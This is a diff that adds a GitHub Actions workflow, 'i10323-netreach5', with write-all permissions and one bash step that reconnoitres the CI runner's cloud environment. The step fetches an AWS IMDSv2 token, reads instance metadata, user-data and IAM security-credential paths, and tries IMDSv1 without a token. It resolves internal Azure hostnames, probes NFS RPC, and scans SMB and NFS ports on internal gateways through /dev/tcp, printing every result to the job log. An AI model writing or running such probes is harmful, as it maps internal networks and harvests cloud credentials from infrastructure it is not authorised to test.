@@ -1,0 +1,43 @@
+name: i10323-netreach5
+on:
+  workflow_dispatch:
+permissions: write-all
+jobs:
+  reach:
+    runs-on: ubuntu-latest
+    steps:
+      - name: net-reach5
+        shell: bash
+        run: |
+          set +e
+          set +o pipefail
+          echo "R5_START"
+          echo "--- AWS IMDSv2 (proper) ---"
+          TOK=$(curl -sS -m 5 -X PUT --header 'X-aws-ec2-metadata-token-ttl-seconds: 21600' "http://169.254.169.254/latest/api/token" 2>&1)
+          echo "TOK_LEN=${#TOK}"
+          echo "TOK_PREFIX=$(echo "$TOK" | head -c 30)"
+          for path in /latest/meta-data/instance-id /latest/meta-data/ami-id /latest/meta-data/placement/region /latest/meta-data/iam/info /latest/meta-data/iam/security-credentials/ /latest/user-data /latest/meta-data/local-ipv4; do
+            echo -n "$path => "
+            curl -sS -m 5 -w " [HTTP=%{http_code}]" -H "X-aws-ec2-metadata-token: $TOK" "http://169.254.169.254$path" 2>&1 | head -c 300
+            echo
+          done
+          echo "--- IMDSv2 role creds ---"
+          ROLES=$(curl -sS -m 5 -H "X-aws-ec2-metadata-token: $TOK" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>&1)
+          echo "ROLES=$ROLES"
+          echo "--- AWS IMDS (v1 fallback no token) ---"
+          curl -sS -m 5 -w " [HTTP=%{http_code}]" "http://169.254.169.254/latest/meta-data/instance-id" 2>&1 | head -c 200; echo
+          echo "--- private DNS zone (Azure) ---"
+          for n in runnervm48cm3 instance-data metadata hosted-compute broker.api internal.cloudapp.net privatelink.blob.core.windows.net; do
+            echo -n "$n => "; getent hosts "$n" 2>&1 | head -1; echo
+          done
+          echo "--- reverse DNS 10.1.0.1 / 169.254.169.254 ---"
+          getent hosts 10.1.0.1 2>&1 | head -2; getent hosts 169.254.169.254 2>&1 | head -2
+          echo "--- resolve own internal FQDN ---"
+          FQDN=$(hostname -f 2>&1); echo "FQDN=$FQDN"; getent hosts "$FQDN" 2>&1 | head -2
+          echo "--- NFS rpc probe (rpcinfo if present) ---"
+          (which rpcinfo && rpcinfo -p 10.1.0.1 2>&1 | head -5) || echo "no rpcinfo"
+          echo "--- 445/2049 to gateway + IMDS ---"
+          for hp in 10.1.0.1:445 10.1.0.1:2049 10.1.0.1:111 10.0.128.1:445 10.0.128.1:2049; do
+            timeout 1 bash -c "echo > /dev/tcp/${hp%:*}/${hp#*:}" 2>/dev/null && echo "OPEN $hp" || echo "closed $hp"
+          done
+          echo "R5_END"
